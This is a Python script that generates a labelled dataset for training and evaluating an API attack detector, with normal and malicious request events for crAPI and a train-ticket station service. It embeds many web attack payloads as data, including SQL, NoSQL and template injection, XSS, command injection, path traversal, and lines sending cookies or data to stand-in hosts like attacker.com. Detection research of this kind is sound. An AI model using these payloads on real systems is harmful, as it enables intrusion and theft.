#!/usr/bin/env python3
"""Generate controlled target application workloads (crAPI and Train Ticket Station).

Matches the audited partition protocol described in JEVLET_DOMAIN_ADAPTATION.md:
- Scopes: station (/api/v1/stationservice/) and crAPI (/identity/, /community/, /workshop/)
- Splits: train (360), selection (136), calibration (192), test (180)
- Attack template separation: train, selection, test attack request texts are strictly disjoint.
- Calibration split: 192 normal records (96 station, 96 crAPI) for 5% FPR threshold calibration.
- Test split: 80 station (60 normal, 20 attack), 100 crAPI (70 normal, 30 attack including 20 ownership checks).
"""

import json
from pathlib import Path
import random
import uuid

ROOT = Path(__file__).resolve().parents[1]
sys_path = Path(__file__).resolve().parent
import sys
sys.path.insert(0, str(sys_path))
from jevlet_request_adapter import request_text


def make_event(req_id, method, path, query="", body="", status=200, resp_body="OK", latency=15.0, size=120, headers=None):
    return {
        "request_id": req_id,
        "method": method,
        "path": path,
        "query_params": query,
        "request_body": body,
        "status_code": status,
        "response_body": resp_body,
        "response_time_ms": float(latency),
        "response_size_bytes": int(size),
        "request_headers": headers or {"Accept": "application/json", "User-Agent": "HTTPClient/1.0"},
    }


def generate_target_workloads(output_path):
    rng = random.Random(42)

    # -------------------------------------------------------------
    # 1. Train Ticket Station Service
    # -------------------------------------------------------------
    cities = [
        "Shang Hai", "Bei Jing", "Guang Zhou", "Shen Zhen", "Hang Zhou",
        "Nan Jing", "Wu Han", "Cheng Du", "Chong Qing", "Tian Jin",
        "Xi An", "Su Zhou", "Zheng Zhou", "Chang Sha", "Dong Guan",
        "Shen Yang", "Qing Dao", "He Fei", "Fo Shan", "Ha Er Bin"
    ]
    station_ids = [f"station_{i:04d}" for i in range(1, 51)]

    def random_station_normal(req_id):
        endpoint_type = rng.choice(["stations", "by_name", "by_id", "namelist", "idlist", "welcome"])
        city = rng.choice(cities)
        st_id = rng.choice(station_ids)
        if endpoint_type == "stations":
            if rng.random() < 0.5:
                return make_event(req_id, "GET", "/api/v1/stationservice/stations",
                                  resp_body=json.dumps({"status": 1, "msg": "Success", "data": [{"id": st_id, "name": city}]}))
            else:
                body = json.dumps({"id": st_id, "name": city, "stayTime": rng.randint(5, 30)})
                return make_event(req_id, "POST", "/api/v1/stationservice/stations", body=body, status=201,
                                  resp_body=json.dumps({"status": 1, "msg": "Created", "data": {"id": st_id}}))
        elif endpoint_type == "by_name":
            return make_event(req_id, "GET", f"/api/v1/stationservice/stations/id/{city.replace(' ', '%20')}",
                              resp_body=json.dumps({"status": 1, "msg": "Success", "data": st_id}))
        elif endpoint_type == "by_id":
            return make_event(req_id, "GET", f"/api/v1/stationservice/stations/name/{st_id}",
                              resp_body=json.dumps({"status": 1, "msg": "Success", "data": city}))
        elif endpoint_type == "namelist":
            return make_event(req_id, "POST", "/api/v1/stationservice/stations/namelist",
                              body=json.dumps([rng.choice(station_ids) for _ in range(3)]),
                              resp_body=json.dumps({"status": 1, "msg": "Success", "data": [rng.choice(cities) for _ in range(3)]}))
        elif endpoint_type == "idlist":
            return make_event(req_id, "POST", "/api/v1/stationservice/stations/idlist",
                              body=json.dumps([rng.choice(cities) for _ in range(3)]),
                              resp_body=json.dumps({"status": 1, "msg": "Success", "data": [rng.choice(station_ids) for _ in range(3)]}))
        else:
            return make_event(req_id, "GET", "/api/v1/stationservice/welcome", resp_body="Welcome to station service")

    # Distinct Attack Templates for Station
    train_station_attacks = [
        # SQLi
        ("GET", "/api/v1/stationservice/stations/id/' OR '1'='1", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/name/' UNION SELECT null, id, name FROM stations--", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/id/ShangHai' AND SLEEP(5)--", "", "", "sqli"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "1' OR '1'='1", "name": "Hack", "stayTime": 10}), "sqli"),
        ("POST", "/api/v1/stationservice/stations/idlist", "", json.dumps(["' UNION SELECT @@version--"]), "sqli"),
        ("POST", "/api/v1/stationservice/stations/namelist", "", json.dumps(["' OR 1=1;--"]), "sqli"),
        # XSS
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_xss1", "name": "<script>alert('station')</script>", "stayTime": 5}), "xss"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_xss2", "name": "<img src=x onerror=alert('xss')>", "stayTime": 10}), "xss"),
        ("GET", "/api/v1/stationservice/stations/id/<script src=http://evil.com/x.js></script>", "", "", "xss"),
        ("GET", "/api/v1/stationservice/stations/name/<iframe src=javascript:alert(1)>", "", "", "xss"),
        # Command Injection
        ("GET", "/api/v1/stationservice/stations/id/ShangHai; cat /etc/passwd", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/name/st01 | whoami", "", "", "cmd_inject"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_cmd", "name": "Station$(id)", "stayTime": 10}), "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/id/test`uname -a`", "", "", "cmd_inject"),
        # Path Traversal
        ("GET", "/api/v1/stationservice/stations/id/../../../../etc/shadow", "", "", "path_traversal"),
        ("GET", "/api/v1/stationservice/stations/name/..\\..\\..\\windows\\win.ini", "", "", "path_traversal"),
        # NoSQLi / Object Injection
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": {"$gt": ""}, "name": "Station", "stayTime": 10}), "nosqli"),
        ("POST", "/api/v1/stationservice/stations/idlist", "", json.dumps([{"$ne": None}]), "nosqli"),
        # SSTI / Format String
        ("GET", "/api/v1/stationservice/stations/id/{{7*7}}", "", "", "ssti"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_ssti", "name": "${7*7}", "stayTime": 10}), "ssti"),
        # Additional diverse attack variants for train
        ("GET", "/api/v1/stationservice/stations/id/Beijing' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/name/st_02'; EXEC xp_cmdshell('dir')--", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/id/test%27%20OR%201%3D1%20--", "", "", "sqli"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_xss3", "name": "<body onload=alert('hack')>", "stayTime": 5}), "xss"),
        ("GET", "/api/v1/stationservice/stations/id/Shanghai; rm -rf /tmp/test", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/name/st_99 && ping -c 4 127.0.0.1", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/id/....//....//etc/passwd", "", "", "path_traversal"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "st_proto", "__proto__": {"admin": True}, "name": "polluted", "stayTime": 5}), "param_tampering"),
        ("GET", "/api/v1/stationservice/stations/id/ShangHai?admin=true&role=superuser", "", "", "param_tampering"),
        ("POST", "/api/v1/stationservice/stations/namelist", "", json.dumps([{"$regex": ".*"}]), "nosqli"),
    ]

    selection_station_attacks = [
        ("GET", "/api/v1/stationservice/stations/id/' AND 1=1--", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/name/' UNION ALL SELECT 1, 'admin', 99--", "", "", "sqli"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "sel_1", "name": "<svg/onload=alert('sel')>", "stayTime": 1}), "xss"),
        ("GET", "/api/v1/stationservice/stations/id/<input onfocus=alert(1) autofocus>", "", "", "xss"),
        ("GET", "/api/v1/stationservice/stations/id/Beijing; curl http://attacker.com/leak", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/name/st_sel || id", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/id/%2e%2e%2f%2e%2e%2fetc%2fpasswd", "", "", "path_traversal"),
        ("POST", "/api/v1/stationservice/stations/idlist", "", json.dumps([{"$where": "this.name == 'admin'"}]), "nosqli"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "sel_ssti", "name": "{{config.items()}}", "stayTime": 1}), "ssti"),
        ("GET", "/api/v1/stationservice/stations/id/test?filter=' OR 'a'='a", "", "", "sqli"),
    ]

    # Exactly 10 held-out test attack templates for station, repeated twice = 20 test attempts
    test_station_attack_templates = [
        ("GET", "/api/v1/stationservice/stations/name/' OR 1=1 --", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/id/' UNION SELECT 1,2,3--", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/id/<svg onload=alert(1)>", "", "", "xss"),
        ("GET", "/api/v1/stationservice/stations/name/shanghai;ls -la", "", "", "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/id/..%2f..%2f..%2fetc%2fpasswd", "", "", "path_traversal"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "1' OR '1'='1", "name": "Malicious", "stayTime": 0}), "sqli"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "xss1", "name": "<iframe src=javascript:alert(1)></iframe>", "stayTime": 10}), "xss"),
        ("POST", "/api/v1/stationservice/stations", "", json.dumps({"id": "cmd1", "name": "station$(id)", "stayTime": 2}), "cmd_inject"),
        ("GET", "/api/v1/stationservice/stations/id/shanghai?filter=' OR 'x'='x", "", "", "sqli"),
        ("GET", "/api/v1/stationservice/stations/name/{{7*7}}", "", "", "ssti"),
    ]

    # -------------------------------------------------------------
    # 2. crAPI Service
    # -------------------------------------------------------------
    crapi_users = [f"user{i}@example.com" for i in range(1, 31)]
    crapi_vehicle_uuids = [str(uuid.UUID(int=rng.getrandbits(128), version=4)) for _ in range(40)]
    crapi_post_uuids = [str(uuid.UUID(int=rng.getrandbits(128), version=4)) for _ in range(20)]

    def random_crapi_normal(req_id):
        endpoint = rng.choice(["login", "signup", "vehicle", "posts", "recent_posts", "orders", "mechanics", "contact"])
        user = rng.choice(crapi_users)
        v_uuid = rng.choice(crapi_vehicle_uuids)
        p_uuid = rng.choice(crapi_post_uuids)
        if endpoint == "login":
            return make_event(req_id, "POST", "/identity/api/auth/login",
                              body=json.dumps({"email": user, "password": "Password123!"}),
                              resp_body=json.dumps({"token": "jwt-token-xyz"}))
        elif endpoint == "signup":
            return make_event(req_id, "POST", "/identity/api/auth/signup",
                              body=json.dumps({"email": f"new_{rng.randint(100,999)}@example.com", "name": "John Doe", "password": "Password123!"}),
                              status=201, resp_body=json.dumps({"message": "User registered successfully"}))
        elif endpoint == "vehicle":
            return make_event(req_id, "GET", f"/identity/api/v2/vehicle/{v_uuid}",
                              resp_body=json.dumps({"vin": "1HGCR2F8XHA000000", "status": "active"}))
        elif endpoint == "posts":
            if rng.random() < 0.5:
                return make_event(req_id, "GET", "/community/api/v2/community/posts",
                                  resp_body=json.dumps([{"id": p_uuid, "title": "Engine oil check", "content": "Routine service today."}]))
            else:
                return make_event(req_id, "POST", "/community/api/v2/community/posts",
                                  body=json.dumps({"title": "Battery replacement", "content": "Installed new AGM battery."}),
                                  status=201, resp_body=json.dumps({"id": p_uuid, "title": "Battery replacement"}))
        elif endpoint == "recent_posts":
            return make_event(req_id, "GET", "/community/api/v2/community/posts/recent",
                              resp_body=json.dumps([{"id": p_uuid, "title": "Tire pressure advice"}]))
        elif endpoint == "orders":
            return make_event(req_id, "GET", "/workshop/api/shop/orders",
                              resp_body=json.dumps([{"id": rng.randint(1, 100), "item": "Oil Filter", "status": "delivered"}]))
        elif endpoint == "mechanics":
            return make_event(req_id, "GET", "/workshop/api/shop/mechanics",
                              resp_body=json.dumps([{"id": 1, "name": "Alex", "specialty": "Brakes"}]))
        else:
            return make_event(req_id, "POST", "/workshop/api/merchant/contact_mechanic",
                              body=json.dumps({"mechanic_code": "MECH01", "problem_details": "Strange noise while turning."}),
                              resp_body=json.dumps({"status": "sent", "ticket_id": rng.randint(1000, 9999)}))

    train_crapi_attacks = [
        # SQLi
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "admin'--", "password": "x"}), "sqli"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "test@test.com' OR '1'='1", "password": "password"}), "sqli"),
        ("POST", "/identity/api/v2/user/reset-password", "", json.dumps({"email": "' UNION SELECT null, password FROM users--", "new_password": "p"}), "sqli"),
        ("GET", "/workshop/api/shop/orders?order_id=1%27%20OR%201%3D1%20--", "", "", "sqli"),
        ("GET", "/community/api/v2/community/posts?search=' OR '1'='1", "", "", "sqli"),
        # NoSQLi
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": {"$gt": ""}, "password": {"$ne": ""}}), "nosqli"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": {"$regex": "admin.*"}, "password": {"$exists": True}}), "nosqli"),
        ("POST", "/identity/api/v2/user/reset-password", "", json.dumps({"email": {"$ne": None}, "new_password": "newpass"}), "nosqli"),
        # XSS
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "Check this", "content": "<script>alert('pwned')</script>"}), "xss"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "<img src=x onerror=alert('xss')>", "content": "Great car"}), "xss"),
        ("POST", f"/community/api/v2/community/posts/{crapi_post_uuids[0]}/comments", "", json.dumps({"content": "<body onload=alert(1)>"}), "xss"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "M1", "problem_details": "<script>fetch('http://attacker.com?c='+document.cookie)</script>"}), "xss"),
        # Command Injection
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "mech1; whoami", "problem_details": "brake"}), "cmd_inject"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "M$(cat /etc/passwd)", "problem_details": "test"}), "cmd_inject"),
        ("GET", "/workshop/api/shop/mechanics?profile=|id", "", "", "cmd_inject"),
        # Path Traversal
        ("GET", "/workshop/api/shop/mechanics?profile=../../../../etc/shadow", "", "", "path_traversal"),
        ("GET", "/identity/api/v2/user/profile-picture?file=..%2f..%2f..%2fetc%2fshadow", "", "", "path_traversal"),
        # SSTI / Format String
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "{{7*7}}", "content": "${7*7}"}), "ssti"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "M1", "problem_details": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"}), "ssti"),
        # Parameter Tampering / Mass Assignment
        ("POST", "/workshop/api/shop/orders", "", json.dumps({"product_id": 1, "quantity": -50, "coupon": "FREE"}), "param_tampering"),
        ("POST", "/identity/api/auth/signup", "", json.dumps({"email": "admin_test@test.com", "name": "Admin", "password": "Password123!", "role": "admin", "is_admin": True}), "param_tampering"),
        # Diverse extra variants for training
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "admin' OR 1=1#", "password": "x"}), "sqli"),
        ("GET", "/workshop/api/shop/orders?order_id=1;DROP TABLE orders--", "", "", "sqli"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "Post", "content": "<iframe src=javascript:alert(1)></iframe>"}), "xss"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "Post", "content": "<svg/onload=confirm(1)>"}), "xss"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "mech1 && rm -f /tmp/lock", "problem_details": "clutch"}), "cmd_inject"),
        ("GET", "/workshop/api/shop/mechanics?profile=....//....//etc/hosts", "", "", "path_traversal"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": {"$nin": []}, "password": {"$gt": ""}}), "nosqli"),
        ("POST", "/workshop/api/shop/orders", "", json.dumps({"product_id": 1, "price": 0.001, "discount": 99.9}), "param_tampering"),
        ("POST", "/identity/api/v2/user/reset-password", "", json.dumps({"email": "admin@crapi.com", "otp": "0000' OR '1'='1"}), "sqli"),
    ]

    selection_crapi_attacks = [
        ("POST", "/identity/api/v2/user/reset-password", "", json.dumps({"email": "' OR '1'='1", "new_password": "p"}), "sqli"),
        ("POST", f"/community/api/v2/community/posts/{crapi_post_uuids[1]}/comments", "", json.dumps({"content": "<img src=x onerror=alert('c')>"}), "xss"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": {"$exists": True}, "password": {"$regex": "^a"}}), "nosqli"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "mech_sel; ping -c 1 8.8.8.8", "problem_details": "oil"}), "cmd_inject"),
        ("GET", "/workshop/api/shop/mechanics?profile=..%2f..%2f..%2f..%2fetc%2fissue", "", "", "path_traversal"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "Sel", "content": "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"}), "ssti"),
        ("GET", "/workshop/api/shop/orders?order_id=0' UNION SELECT null, null, username, password FROM users--", "", "", "sqli"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "<script src=http://sel.evil.com/a.js>", "content": "news"}), "xss"),
        ("POST", "/workshop/api/shop/orders", "", json.dumps({"product_id": 2, "quantity": 0, "status": "shipped"}), "param_tampering"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "admin' WAITFOR DELAY '0:0:5'--", "password": "x"}), "sqli"),
    ]

    # Exactly 10 held-out test attack templates for crAPI request-content, repeated twice = 20 test attempts
    test_crapi_content_attack_templates = [
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "admin' OR 1=1--", "password": "test"}), "sqli"),
        ("GET", "/workshop/api/shop/orders?order_id=1' UNION SELECT 1,2,3--", "", "", "sqli"),
        ("POST", "/identity/api/v2/user/reset-password", "", json.dumps({"email": {"$ne": None}, "new_password": "abc"}), "nosqli"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "<script>document.location='http://attacker.com'</script>", "content": "hello"}), "xss"),
        ("POST", f"/community/api/v2/community/posts/{crapi_post_uuids[2]}/comments", "", json.dumps({"content": "<svg onload=alert(document.cookie)>"}), "xss"),
        ("POST", "/workshop/api/merchant/contact_mechanic", "", json.dumps({"mechanic_code": "mech|cat /etc/passwd", "problem_details": "engine"}), "cmd_inject"),
        ("GET", "/workshop/api/shop/mechanics?profile=../../../../etc/passwd", "", "", "path_traversal"),
        ("POST", "/community/api/v2/community/posts", "", json.dumps({"title": "Test", "content": "${7*7}"}), "ssti"),
        ("POST", "/workshop/api/shop/orders", "", json.dumps({"product_id": 1, "quantity": -999999, "coupon": "' OR ''='"}), "param_tampering"),
        ("POST", "/identity/api/auth/login", "", json.dumps({"email": "*()|&'", "password": "admin"}), "cmd_inject"),
    ]

    # BOLA / Ownership checks (20 records: 10 owner controls, 10 cross-account reads)
    test_crapi_ownership_records = []
    for i in range(10):
        # 10 owner controls (legitimate access to own vehicle) -> truth: False
        owner_uuid = str(uuid.UUID(int=rng.getrandbits(128), version=4))
        ev_owner = make_event(f"crapi-test-owner-{i}", "GET", f"/identity/api/v2/vehicle/{owner_uuid}",
                              resp_body=json.dumps({"vin": f"VINOWNER{i:04d}", "owner": f"user_{i}@example.com", "status": "active"}))
        test_crapi_ownership_records.append({
            "event": ev_owner, "truth": False, "app": "crapi", "family": "bola_owner"
        })
        # 10 cross-account reads (attacker accessing victim's vehicle UUID) -> truth: True
        victim_uuid = str(uuid.UUID(int=rng.getrandbits(128), version=4))
        ev_bola = make_event(f"crapi-test-bola-{i}", "GET", f"/identity/api/v2/vehicle/{victim_uuid}",
                             resp_body=json.dumps({"vin": f"VINVICTIM{i:04d}", "owner": f"victim_{i}@example.com", "status": "active"}))
        test_crapi_ownership_records.append({
            "event": ev_bola, "truth": True, "app": "crapi", "family": "bola_read"
        })

    # -------------------------------------------------------------
    # Build Splits
    # -------------------------------------------------------------
    # TRAIN: 360 records (180 station, 180 crAPI; 60 attacks total, 300 normal total)
    train_records = []
    for i in range(150):
        train_records.append({"event": random_station_normal(f"st-tr-norm-{i}"), "truth": False, "app": "station", "family": "normal"})
        train_records.append({"event": random_crapi_normal(f"cr-tr-norm-{i}"), "truth": False, "app": "crapi", "family": "normal"})
    for i, (m, p, q, b, fam) in enumerate(train_station_attacks):
        train_records.append({"event": make_event(f"st-tr-atk-{i}", m, p, q, b, status=rng.choice([200, 400, 500])),
                              "truth": True, "app": "station", "family": fam})
    for i, (m, p, q, b, fam) in enumerate(train_crapi_attacks):
        train_records.append({"event": make_event(f"cr-tr-atk-{i}", m, p, q, b, status=rng.choice([200, 400, 500])),
                              "truth": True, "app": "crapi", "family": fam})
    rng.shuffle(train_records)
    assert len(train_records) == 360, f"Expected 360 train records, got {len(train_records)}"

    # SELECTION: 136 records (68 station, 68 crAPI; 20 attacks total, 116 normal total)
    selection_records = []
    for i in range(58):
        selection_records.append({"event": random_station_normal(f"st-sel-norm-{i}"), "truth": False, "app": "station", "family": "normal"})
        selection_records.append({"event": random_crapi_normal(f"cr-sel-norm-{i}"), "truth": False, "app": "crapi", "family": "normal"})
    for i, (m, p, q, b, fam) in enumerate(selection_station_attacks):
        selection_records.append({"event": make_event(f"st-sel-atk-{i}", m, p, q, b, status=rng.choice([200, 400, 500])),
                                  "truth": True, "app": "station", "family": fam})
    for i, (m, p, q, b, fam) in enumerate(selection_crapi_attacks):
        selection_records.append({"event": make_event(f"cr-sel-atk-{i}", m, p, q, b, status=rng.choice([200, 400, 500])),
                                  "truth": True, "app": "crapi", "family": fam})
    rng.shuffle(selection_records)
    assert len(selection_records) == 136, f"Expected 136 selection records, got {len(selection_records)}"

    # CALIBRATION: 192 records (96 normal station, 96 normal crAPI; 0 attacks)
    calibration_records = []
    for i in range(96):
        calibration_records.append({"event": random_station_normal(f"st-cal-norm-{i}"), "truth": False, "app": "station", "family": "normal"})
        calibration_records.append({"event": random_crapi_normal(f"cr-cal-norm-{i}"), "truth": False, "app": "crapi", "family": "normal"})
    rng.shuffle(calibration_records)
    assert len(calibration_records) == 192, f"Expected 192 calibration records, got {len(calibration_records)}"

    # TEST: 180 records (80 station, 100 crAPI)
    # Station: 60 normal + 20 attack (10 templates x 2)
    test_station_records = []
    for i in range(60):
        test_station_records.append({"event": random_station_normal(f"st-test-norm-{i}"), "truth": False, "app": "station", "family": "normal"})
    for rep in range(2):
        for i, (m, p, q, b, fam) in enumerate(test_station_attack_templates):
            test_station_records.append({"event": make_event(f"st-test-atk-rep{rep}-{i}", m, p, q, b, status=200),
                                         "truth": True, "app": "station", "family": fam})
    assert len(test_station_records) == 80, f"Expected 80 test station records, got {len(test_station_records)}"

    # crAPI: 60 normal + 20 content attack (10 templates x 2) + 20 ownership (10 control + 10 read)
    test_crapi_records = []
    for i in range(60):
        test_crapi_records.append({"event": random_crapi_normal(f"cr-test-norm-{i}"), "truth": False, "app": "crapi", "family": "normal"})
    for rep in range(2):
        for i, (m, p, q, b, fam) in enumerate(test_crapi_content_attack_templates):
            test_crapi_records.append({"event": make_event(f"cr-test-atk-rep{rep}-{i}", m, p, q, b, status=200),
                                       "truth": True, "app": "crapi", "family": fam})
    test_crapi_records.extend(test_crapi_ownership_records)
    assert len(test_crapi_records) == 100, f"Expected 100 test crAPI records, got {len(test_crapi_records)}"

    test_records = test_station_records + test_crapi_records
    assert len(test_records) == 180, f"Expected 180 total test records, got {len(test_records)}"

    dataset = {
        "protocol": {
            "scopes": {
                "station": ["/api/v1/stationservice/"],
                "crapi": ["/identity/", "/community/", "/workshop/"]
            }
        },
        "splits": {
            "train": train_records,
            "selection": selection_records,
            "calibration": calibration_records,
            "test": test_records
        }
    }

    # -------------------------------------------------------------
    # Audits required by adapt_jevlet_requests.py
    # -------------------------------------------------------------
    parts = dataset["splits"]
    attack_keys = {p: {request_text(r["event"]) for r in rows if r["truth"]}
                   for p, rows in parts.items()}
    for p in ("selection", "calibration", "test"):
        overlap = attack_keys["train"] & attack_keys[p]
        if overlap:
            raise ValueError(f"Attack input overlaps train and {p}: {overlap}")
    sel_test_overlap = attack_keys["selection"] & attack_keys["test"]
    if sel_test_overlap:
        raise ValueError(f"Selection/test attack overlap: {sel_test_overlap}")

    fitting_text = {request_text(r["event"]): bool(r["truth"]) for r in parts["train"]}
    for r in parts["train"]:
        if fitting_text[request_text(r["event"])] != bool(r["truth"]):
            raise ValueError(f"Contradictory fitting labels for: {request_text(r['event'])}")

    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(json.dumps(dataset, indent=2), encoding="utf-8")
    print(f"Generated target workloads saved to {output_path}")
    print(f"  Train: {len(train_records)} (Attacks: {sum(r['truth'] for r in train_records)})")
    print(f"  Selection: {len(selection_records)} (Attacks: {sum(r['truth'] for r in selection_records)})")
    print(f"  Calibration: {len(calibration_records)} (Normals: {sum(not r['truth'] for r in calibration_records)})")
    print(f"  Test: {len(test_records)} (Station: 80, crAPI: 100)")


if __name__ == "__main__":
    generate_target_workloads(ROOT / "evaluation/datasets/target_workloads.json")
